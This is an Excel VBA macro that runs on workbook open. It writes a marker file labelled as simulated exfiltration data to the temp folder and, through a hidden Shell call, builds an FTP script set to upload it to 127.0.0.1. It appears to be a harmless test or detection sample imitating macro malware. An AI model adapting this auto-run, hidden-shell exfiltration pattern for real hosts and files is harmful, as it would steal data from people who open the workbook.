Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim frs0swbone As Integer, logPath As String
    logPath = Environ("TEMP") & "\oblivionx_log.txt"
    frs0swbone = FreeFile
    Open logPath For Output As #frs0swbone
    Print #frs0swbone, "marker-ftp-log: simulated exfiltration data"
    Close #frs0swbone
    Shell "cmd /c echo open 127.0.0.1> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo put oblivionx_log.txt>> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo quit>> " & Environ("TEMP") & "\oblivionx_ftp.txt", 0
End Sub
